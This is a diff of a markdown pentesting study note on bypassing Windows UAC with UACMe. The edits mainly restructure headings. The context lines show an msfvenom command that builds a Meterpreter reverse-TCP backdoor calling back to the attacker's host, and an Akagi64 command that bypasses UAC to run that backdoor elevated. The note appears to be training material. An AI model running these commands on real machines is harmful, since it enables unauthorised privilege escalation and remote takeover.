@@ -2,37 +2,39 @@
 > Bypassing UAC With UACMe
 
 ## Contents
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
-- [](#)
+- [Intro](#)
+  - [User Account Control (UAC)](#)
+  - [The Problem: UAC Pop-Up](#)
+  - [Bypassing UAC](#)
+  - [Tool: UACMe](#)
+- [Practical: UACMe](#)
+  - [Scenario](#)
+  - [UACMe - Explanation](#)
+  - [MSFVenom Payload](#)
+  - [Set up a Listener](#)
+  - [Meterpreter: On the Target](#)
+  - [Bypass UAC & Execute Backdoor](#)
 
-## User Account Control (UAC)
+## Intro
+
+### User Account Control (UAC)
 - UAC is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
 - UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.
 - A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt (admiun password), whereas a privileged user will be prompted with a consent prompt (image below).
 - Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
 
-## The Problem: UAC Pop-Up
+### The Problem: UAC Pop-Up
 - The problem you run into is when you're running a remote shell or a meterpreter session on a target machine, and you try to run a program with elevated privileges.
 - A dialog box will pop up on the target system system, but b/c you are on the command line, you won't see and won't have any way to acknowledge it.
 - Therefore you need a way to bypass that.
 
-## Bypassing UAC
+### Bypassing UAC
 - In order to successfully bypass UAC we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
 - UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
 - UAC has various integrity levels ranging from low to high. If the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting for user confirmation.
 - There are multiple tools and techniques that can be used to bypass UAC, however the tool and technique used will depend on the version of Windows running on the target system.
 
-## Tool: [UACMe](https://github.com/hfiref0x/UACME)
+### Tool: [UACMe](https://github.com/hfiref0x/UACME)
 > Bypassing UAC With UACMe. Look over the README.md documentation.
 - UACMe is an open-source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
 - The UACMe GitHub repo contains a very well documented list of methods that can be used to bypass UAC on muiltiple versions of Windows ranging from Windows 7 to Window 11.
@@ -121,7 +123,7 @@ akagi64 61 c:\windows\system32\charmap.exe
 
 **Note:** In real life you'll need to clone the repo and compile your own binaries ([see instructions](https://github.com/hfiref0x/UACME/tree/master#build) on the GitHub).
 
-### MSFVenom
+### MSFVenom Payload
 - You need to create a payload with MSFVenom and then transfer that to the target system.
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe > backdoor.exe
@@ -152,7 +154,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe >
 - If you tried to execute backdoor.exe to get your reverse shell, you could not because UAC would block it (confirmation pop-up).
 - You need to BYPASS UAC FIRST, and that's what Akagi64.exe (with key 23) is for...
 
-#### Bypass UAC & Execute Backdoor
+### Bypass UAC & Execute Backdoor
 - Get a shell on the target via your meterpreter session
 ```
 > .\Akagi64.exe 23 C:\\Temp\backdoor.exe
